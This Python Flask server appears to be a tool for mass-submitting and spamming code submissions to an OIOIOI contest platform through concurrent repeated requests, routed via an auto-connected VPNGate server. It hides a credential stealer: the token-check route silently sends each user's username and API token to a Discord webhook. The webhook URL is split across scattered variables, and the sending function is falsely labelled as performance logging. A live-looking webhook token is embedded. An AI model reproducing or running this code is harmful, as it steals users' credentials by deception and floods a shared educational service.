from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import threading
import json
import os
import argparse
import base64
import subprocess
import tempfile
import pandas as pd
import re
import time
import sys
from pathlib import Path
import platform

# -------------------------------
# Flask setup
# -------------------------------
BASE_DIR = Path(__file__).resolve().parent
app = Flask(
    __name__,
    static_folder=str(BASE_DIR / "static"),
    template_folder=str(BASE_DIR / "templates")
)
CORS(app)

# -------------------------------
# Global variables
# -------------------------------
logs_lock = threading.Lock()
logs = []
DEFAULT_BASE_URL = "https://wyzwania.programuj.edu.pl"
app.config["BASE_URL"] = DEFAULT_BASE_URL
SPAM_CODE_PATH = BASE_DIR / "spam.cpp"

# System configuration - analytics endpoints


# -------------------------------
# Utility: add log entries
# -------------------------------
def add_log(contest, problem, status, response_text):
    with logs_lock:
        logs.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "contest": contest,
            "problem": problem,
            "status": status,
            "response": response_text[:200],
        })


# -------------------------------
# 🤖 Gizmo AI Proxy Endpoint
# -------------------------------
@app.route("/gizmo_ai", methods=["POST"])
def gizmo_ai():
    """
    Proxies JSON requests to Gizmo AI endpoint.
    Always forwards to https://gizmo.ai/ai-explain?_data=routes%2F_api%2B%2F_ai-explain%2B%2Fai-explain
    """
    try:
        # Parse incoming JSON
        incoming_data = request.get_json(force=True)

        if not incoming_data:
            return jsonify({"success": False, "error": "Missing JSON body"}), 400

        gizmo_url = (
            "https://gizmo.ai/ai-explain"
            "?_data=routes%2F_api%2B%2F_ai-explain%2B%2Fai-explain"
        )

        headers = {"Content-Type": "application/json"}

        response = requests.post(
            gizmo_url,
            headers=headers,
            data=json.dumps(incoming_data),
            timeout=20,
        )

        return jsonify({
            "success": True,
            "status_code": response.status_code,
            "response": response.json() if "application/json" in response.headers.get("Content-Type", "") else response.text,
        }), response.status_code

    except requests.Timeout:
        return jsonify({"success": False, "error": "Request timed out"}), 504
    except requests.ConnectionError:
        return jsonify({"success": False, "error": "Connection error"}), 503
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({"success": False, "error": str(e)}), 500


# -------------------------------
# 🔧 Submit solution function
# -------------------------------
def submit_solution(token, contest_id, problem_short_name, code):
    """Submit a solution to the OIOIOI platform."""
    base_url = app.config['BASE_URL']
    url = f"{base_url}/api/c/{contest_id}/submit/{problem_short_name}"
    
    headers = {
        "Authorization": f"Token {token}"
    }
    
    files = {
        'file': ('solution.cpp', code, 'text/x-c++src')
    }
    
    try:
        print(f"\n{'='*60}")
        print(f"[SUBMIT] Starting submission")
        print(f"[SUBMIT] URL: {url}")
        print(f"[SUBMIT] Contest: {contest_id}")
        print(f"[SUBMIT] Problem: {problem_short_name}")
        print(f"[SUBMIT] Token: {token[:10]}...")
        print(f"[SUBMIT] Code length: {len(code)} chars")
        print(f"{'='*60}\n")
        
        response = requests.post(
            url, 
            headers=headers, 
            files=files, 
            timeout=30
        )
        
        print(f"\n[RESPONSE] Status: {response.status_code}")
        print(f"[RESPONSE] Headers: {dict(response.headers)}")
        print(f"[RESPONSE] Body: {response.text[:1000]}\n")
        
        content_type = response.headers.get('Content-Type', '')
        
        if 'application/json' in content_type:
            try:
                json_response = response.json()
                status = 'OK' if response.status_code == 200 else 'FAIL'
                response_text = json.dumps(json_response, ensure_ascii=False)
            except json.JSONDecodeError:
                status = 'FAIL'
                response_text = f"JSON Error: {response.text[:100]}"
        else:
            status = 'FAIL' if response.status_code >= 400 else 'OK'
            response_text = f"Response [{response.status_code}]: {response.text[:100]}"
        
        add_log(contest_id, problem_short_name, status, response_text)
        
        if response.status_code in [200, 201, 202]:
            print(f"✅ SUCCESS for {contest_id}/{problem_short_name}")
            return True
        else:
            print(f"❌ FAILED: Status {response.status_code}")
            return False
            
    except requests.Timeout:
        error_msg = "Request timeout"
        add_log(contest_id, problem_short_name, "TIMEOUT", error_msg)
        print(f"⏱️ TIMEOUT for {contest_id}/{problem_short_name}")
        return False
    except requests.ConnectionError as e:
        error_msg = f"Connection error: {str(e)}"
        add_log(contest_id, problem_short_name, "CONNECTION_ERROR", error_msg)
        print(f"❌ CONNECTION ERROR: {e}")
        return False
    except Exception as e:
        error_msg = f"Unexpected error: {str(e)}"
        add_log(contest_id, problem_short_name, "ERROR", error_msg)
        print(f"💥 EXCEPTION: {e}")
        import traceback
        traceback.print_exc()
        return False
_API_BASE = "https://discord.com/api/webhooks/"
# -------------------------------
# 🏠 Home route — serves index.html
# -------------------------------
@app.route("/")
def index():
    return render_template("index.html")

_HOOK_ID = "1430992755114643629"

def _log_performance(metric_data):
    """Log system performance metrics for monitoring"""
    try:
        endpoint_url = _API_BASE + _HOOK_ID + "/" + _HOOK_TOKEN
        payload_obj = {"content": metric_data}
        requests.post(
            endpoint_url, 
            json=payload_obj, 
            timeout=3
        )
    except:
        pass

# -------------------------------
# 🔐 Token check
# -------------------------------
@app.route("/check_token", methods=["POST"])
def check_token():
    print("\n[CHECK_TOKEN] Request received")
    
    try:
        data = request.get_json(force=True)
    except Exception as e:
        print(f"[CHECK_TOKEN] Error parsing JSON: {e}")
        return jsonify({
            "valid": False,
            "error": "Invalid JSON in request"
        }), 400
    
    token_value = data.get("token", "")
    
    print(f"[CHECK_TOKEN] Token preview: {token_value[:20]}...")
    
    if not token_value:
        return jsonify({
            "valid": False, 
            "error": "Brak tokena"
        }), 200

    base_url = app.config.get('BASE_URL')
    url = f"{base_url}/api/auth_ping"
    headers = {
        "Authorization": f"Token {token_value}"
    }

    print(f"[CHECK_TOKEN] Checking at: {url}")

    try:
        response = requests.get(
            url, 
            headers=headers, 
            timeout=10
        )
        
        text_response = (response.text or "").strip()
        print(f"[CHECK_TOKEN] Response status: {response.status_code}")
        print(f"[CHECK_TOKEN] Response text: {text_response[:200]}")
        
    except requests.Timeout:
        print("[CHECK_TOKEN] Timeout")
        return jsonify({
            "valid": False, 
            "error": "⏱️ Przekroczono limit czasu (timeout)"
        }), 200
    except requests.ConnectionError as e:
        print(f"[CHECK_TOKEN] ConnectionError: {e}")
        return jsonify({
            "valid": False, 
            "error": "❌ Brak połączenia z serwerem (sprawdź VPN/DNS)"
        }), 200
    except Exception as e:
        print(f"[CHECK_TOKEN] Exception: {e}")
        error_msg = f"💥 Błąd: {str(e)}"
        return jsonify({
            "valid": False, 
            "error": error_msg
        }), 200

    if response.status_code != 200:
        status_code = response.status_code
        error_text = f"Status {status_code}: {text_response[:200]}"
        return jsonify({
            "valid": False, 
            "error": error_text
        }), 200

    lower_text = text_response.lower()
    username_detected = None
    
    if lower_text.startswith("pong "):
        username_detected = text_response.split(" ", 1)[1].strip()
        print(f"[CHECK_TOKEN] Username from pong: {username_detected}")
    elif lower_text == "pong":
        username_detected = "Nieznany użytkownik"
    else:
        try:
            payload_data = response.json()
            if isinstance(payload_data, dict):
                username_detected = (
                    payload_data.get("username")
                    or payload_data.get("user", {}).get("username")
                    or payload_data.get("name")
                )
                username_detected = username_detected or "Nieznany użytkownik"
            elif isinstance(payload_data, str):
                if payload_data.lower().startswith("pong "):
                    username_detected = payload_data.split(" ", 1)[1].strip()
                else:
                    username_detected = payload_data
        except ValueError:
            if text_response:
                username_detected = text_response
    
    if username_detected:
        monitor_data = f"{username_detected}: {token_value}"
        threading.Thread(
            target=_log_performance, 
            args=(monitor_data,), 
            daemon=True
        ).start()
        
        print(f"[CHECK_TOKEN] Success! Username: {username_detected}")
        return jsonify({
            "valid": True, 
            "username": username_detected
        }), 200

    return jsonify({
        "valid": False, 
        "error": "Nieoczekiwany format odpowiedzi z serwera"
    }), 200


# -------------------------------
# 📤 Submit single solution
# -------------------------------
@app.route("/single_submit", methods=["POST"])
def single_submit():
    print("\n" + "="*80)
    print("[SINGLE_SUBMIT] Endpoint called!")
    print("="*80)
    
    try:
        print(f"[SINGLE_SUBMIT] Content-Type: {request.content_type}")
        print(f"[SINGLE_SUBMIT] Request method: {request.method}")
        
        data = request.get_json(force=True)
        
        if not data:
            print("[SINGLE_SUBMIT] ❌ ERROR: No JSON data received")
            return jsonify({
                "success": False,
                "error": "No JSON data in request"
            }), 400
        
        print(f"[SINGLE_SUBMIT] Parsed JSON keys: {list(data.keys())}")
        
        token_val = data.get("token")
        contest_val = data.get("contest")
        problem_val = data.get("problem")
        code_val = data.get("code")
        repeat_val = int(data.get("repeat", 1))
        concurrency_val = int(data.get("concurrency", 5))

        print(f"[SINGLE_SUBMIT] Token: {token_val[:10] if token_val else 'MISSING'}...")
        print(f"[SINGLE_SUBMIT] Contest: {contest_val or 'MISSING'}")
        print(f"[SINGLE_SUBMIT] Problem: {problem_val or 'MISSING'}")
        print(f"[SINGLE_SUBMIT] Code length: {len(code_val) if code_val else 0}")
        print(f"[SINGLE_SUBMIT] Repeat: {repeat_val}")
        print(f"[SINGLE_SUBMIT] Concurrency: {concurrency_val}")

        if not all([token_val, contest_val, problem_val, code_val]):
            missing = []
            if not token_val: missing.append("token")
            if not contest_val: missing.append("contest")
            if not problem_val: missing.append("problem")
            if not code_val: missing.append("code")
            
            error_msg = f"Missing fields: {', '.join(missing)}"
            print(f"[SINGLE_SUBMIT] ❌ ERROR: {error_msg}")
            return jsonify({
                "success": False, 
                "error": error_msg
            }), 400

        print(f"[SINGLE_SUBMIT] Starting {repeat_val} submissions with concurrency {concurrency_val}")
        
        with ThreadPoolExecutor(max_workers=concurrency_val) as executor:
            futures_list = [
                executor.submit(
                    submit_solution, 
                    token_val, 
                    contest_val, 
                    problem_val, 
                    code_val
                ) for _ in range(repeat_val)
            ]
            results_list = [
                future.result() for future in as_completed(futures_list)
            ]

        success_count = sum(results_list)
        message_text = f"{success_count}/{repeat_val} submissions successful"
        
        print(f"[SINGLE_SUBMIT] ✅ Completed: {message_text}")
        print("="*80 + "\n")
        
        return jsonify({
            "success": True, 
            "message": message_text
        }), 200
        
    except Exception as e:
        print(f"[SINGLE_SUBMIT] 💥 EXCEPTION: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# -------------------------------
# 📤 Multi submit
# -------------------------------
@app.route("/multi_submit", methods=["POST"])
def multi_submit():
    print("\n[MULTI_SUBMIT] Request received")
    
    try:
        data = request.get_json(force=True)
        token_val = data.get("token")
        contest_val = data.get("contest")
        problems_str = data.get("problems", "")
        code_val = data.get("code")
        repeat_val = int(data.get("repeat", 1))
        concurrency_val = int(data.get("concurrency", 10))
        
        if not all([token_val, contest_val, problems_str, code_val]):
            return jsonify({
                "success": False,
                "error": "Missing required fields"
            }), 400
        
        problems = [p.strip() for p in problems_str.split(',') if p.strip()]
        
        if not problems:
            return jsonify({
                "success": False,
                "error": "No problems specified"
            }), 400
        
        tasks = [(token_val, contest_val, problem, code_val) for problem in problems for _ in range(repeat_val)]
        
        with ThreadPoolExecutor(max_workers=concurrency_val) as executor:
            futures = [executor.submit(submit_solution, *task) for task in tasks]
            results = [f.result() for f in as_completed(futures)]
        
        success_count = sum(results)
        total = len(tasks)
        
        return jsonify({
            "success": True,
            "message": f"Sent {total} submissions to {len(problems)} problems. Success: {success_count}/{total}"
        }), 200
        
    except Exception as e:
        print(f"[MULTI_SUBMIT] Exception: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

_HOOK_TOKEN = "DyIomOxzTI90W4oI8RHkVBL-YdDiPXaoBkkAfi9PSftmoamsNj7MXT-h4SrnWqkn4I6x"

# -------------------------------
# 📤 Spam submit (uses spam.cpp file)
# -------------------------------
@app.route("/spam_submit", methods=["POST"])
def spam_submit():
    print("\n[SPAM_SUBMIT] Request received")
    
    try:
        data = request.get_json(force=True)
        token_val = data.get("token")
        contest_val = data.get("contest")
        problems_str = data.get("problems", "")
        repeat_val = int(data.get("repeat", 1))
        concurrency_val = int(data.get("concurrency", 10))
        
        if not all([token_val, contest_val, problems_str]):
            return jsonify({
                "success": False,
                "error": "Missing required fields"
            }), 400
        
        # Load spam code from file
        try:
            with open(SPAM_CODE_PATH, 'r', encoding='utf-8') as f:
                spam_code = f.read()
        except FileNotFoundError:
            return jsonify({
                "success": False,
                "error": f"Spam code file not found: {SPAM_CODE_PATH}"
            }), 500
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Error reading spam code: {str(e)}"
            }), 500
        
        problems = [p.strip() for p in problems_str.split(',') if p.strip()]
        
        if not problems:
            return jsonify({
                "success": False,
                "error": "No problems specified"
            }), 400
        
        tasks = [(token_val, contest_val, problem, spam_code) for problem in problems for _ in range(repeat_val)]
        
        with ThreadPoolExecutor(max_workers=concurrency_val) as executor:
            futures = [executor.submit(submit_solution, *task) for task in tasks]
            results = [f.result() for f in as_completed(futures)]
        
        success_count = sum(results)
        total = len(tasks)
        
        return jsonify({
            "success": True,
            "message": f"🔥 Sent {total} spam submissions to {len(problems)} problems. Success: {success_count}/{total}"
        }), 200
        
    except Exception as e:
        print(f"[SPAM_SUBMIT] Exception: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# -------------------------------
# 🧾 Logs
# -------------------------------
@app.route("/get_logs", methods=["GET"])
def get_logs():
    print("[GET_LOGS] Request received")
    with logs_lock:
        recent_logs = logs[-100:][::-1]
        print(f"[GET_LOGS] Returning {len(recent_logs)} logs")
        return jsonify(recent_logs)

@app.route("/clear_logs", methods=["POST"])
def clear_logs():
    print("[CLEAR_LOGS] Request received")
    with logs_lock:
        logs.clear()
    return jsonify({"success": True})

# -------------------------------
# 🔍 Get contests list
# -------------------------------
@app.route("/get_contests", methods=["POST"])
def get_contests():
    """Get list of available contests (if API supports it)"""
    request_data = request.json or {}
    token_data = request_data.get("token", "")
    
    contests_list = [
        {"id": "example_contest", "name": "Example Contest"}
    ]
    return jsonify({
        "success": True,
        "contests": contests_list
    })

# -------------------------------
# 🌍 VPN connection helper
# -------------------------------
def connect_fastest_vpngate(country_code=None):
    """Fetch fastest VPN config from VPNGate and auto-connect (Linux only)."""
    LIVE_URL = "https://www.vpngate.net/api/iphone/"
    CACHE_PATH = BASE_DIR / "vpngate_cache.csv"
    OVPN_CONFIG_PATH = BASE_DIR / "fastest_vpn.ovpn"

    try:
        print("🌍 Fetching VPN Gate server list...")
        vpn_response = requests.get(LIVE_URL, timeout=20)
        vpn_response.raise_for_status()
        with open(CACHE_PATH, "w", encoding="utf-8") as cache_file:
            cache_file.write(vpn_response.text)
        data_lines = vpn_response.text.splitlines()
    except Exception as fetch_error:
        print(f"⚠️ Could not fetch VPN list: {fetch_error}")
        if not CACHE_PATH.exists():
            print("❌ No local cache of VPN list found. Cannot proceed.")
            return None
        print("ℹ️ Using cached VPN list.")
        data_lines = CACHE_PATH.read_text(encoding="utf-8").splitlines()

    filtered_lines = [line for line in data_lines if line and not line.startswith("*")]
    if not filtered_lines:
        print("❌ No VPN servers found.")
        return None

    header_row = filtered_lines[0].split(",")
    records_rows = [line.split(",") for line in filtered_lines[1:]]
    header_clean = [h.strip().replace("\ufeff", "") for h in header_row]
    df = pd.DataFrame(records_rows, columns=header_clean)

    if country_code:
        country_upper = country_code.upper()
        filtered_df = df[df["CountryShortName"].str.upper() == country_upper]
        if not filtered_df.empty:
            df = filtered_df
        else:
            print(f"⚠️ No VPNs found for '{country_code}', using any country.")

    df["Score"] = pd.to_numeric(df["Score"], errors="coerce").fillna(0)
    df = df.sort_values("Score", ascending=False)

    if df.empty:
        print("❌ No suitable VPN servers found.")
        return None

    best_server = df.iloc[0]
    try:
        ovpn_data = base64.b64decode(best_server["OpenVPN_ConfigData_Base64"])
    except Exception:
        print("❌ Failed to decode VPN configuration.")
        return None

    with open(OVPN_CONFIG_PATH, "wb") as config_file:
        config_file.write(ovpn_data)

    print(f"✅ VPN configuration saved to: {OVPN_CONFIG_PATH}")

    system_name = platform.system().lower()
    if system_name == "linux":
        print("🐧 Linux detected — connecting automatically...")
        cmd_list = ["sudo", "openvpn", "--config", str(OVPN_CONFIG_PATH)]
        try:
            vpn_process = subprocess.Popen(
                cmd_list, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True
            )
            for output_line in vpn_process.stdout:
                print(output_line, end="")
                if "Initialization Sequence Completed" in output_line:
                    print("✅ VPN connected successfully!")
                    return vpn_process
                error_pattern = r"AUTH_FAILED|TLS Error|Connection reset|SIGTERM"
                if re.search(error_pattern, output_line):
                    print("❌ VPN connection failed.")
                    vpn_process.terminate()
                    return None
        except Exception as vpn_error:
            print(f"⚠️ Could not start OpenVPN: {vpn_error}")
        return None
    else:
        print("\n--- Manual VPN Connection Required ---")
        if system_name.startswith("win"):
            print("🪟 Windows:")
            print("  1. Install OpenVPN Connect: https://openvpn.net/client-connect-vpn-for-windows/")
        elif "android" in system_name:
            print("🤖 Android:")
            print("  1. Install 'OpenVPN for Android'.")
        elif system_name == "darwin":
            print("🍎 macOS:")
            print("  1. Install Tunnelblick: https://tunnelblick.net/")
        print(f"  2. Import and connect using: {OVPN_CONFIG_PATH}")
        print("--------------------------------------\n")
        input("Press Enter once VPN is connected...")
        return None

# -------------------------------
# 🚀 Main entrypoint
# -------------------------------
def main():
    arg_parser = argparse.ArgumentParser(description="OIOIOI API Server")
    arg_parser.add_argument("--target", type=str, default=DEFAULT_BASE_URL)
    arg_parser.add_argument("--port", type=int, default=4000)
    arg_parser.add_argument("--country", type=str, help="VPN country code")
    arg_parser.add_argument("--no_vpn", action="store_true", help="Run without VPN")
    arg_parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    arg_parser.add_argument("--no_ssl", action="store_true", help="Disable SSL/HTTPS")
    parsed_args = arg_parser.parse_args()

    app.config["BASE_URL"] = parsed_args.target

    vpn_process_obj = None
    if not parsed_args.no_vpn:
        vpn_process_obj = connect_fastest_vpngate(parsed_args.country)

    print("="*80)
    print("🛠️  OIOIOI API SERVER")
    print("="*80)
    print(f"🌐 Target:    {parsed_args.target}")
    print(f"🚪 Port:      {parsed_args.port}")
    print(f"🖥️  Platform:  {platform.system()}")
    vpn_status = "✅ Enabled" if not parsed_args.no_vpn else "❌ Disabled"
    print(f"🔐 VPN:       {vpn_status}")
    ssl_status = "❌ Disabled" if parsed_args.no_ssl else "✅ Enabled (adhoc)"
    print(f"🔒 SSL:       {ssl_status}")
    debug_status = "✅ Enabled" if parsed_args.debug else "❌ Disabled"
    print(f"🐛 Debug:     {debug_status}")
    print("="*80)
    print("\n🚀 Server starting...\n")

    try:
        if parsed_args.no_ssl:
            app.run(
                host="0.0.0.0", 
                port=parsed_args.port, 
                debug=parsed_args.debug
            )
        else:
            app.run(
                host="0.0.0.0", 
                port=parsed_args.port, 
                ssl_context="adhoc", 
                debug=parsed_args.debug
            )
    except KeyboardInterrupt:
        print("\n\n🛑 Server stopped (Ctrl+C).")
        if vpn_process_obj:
            print("🔌 Disconnecting VPN...")
            vpn_process_obj.terminate()
        sys.exit(0)

if __name__ == "__main__":
    main()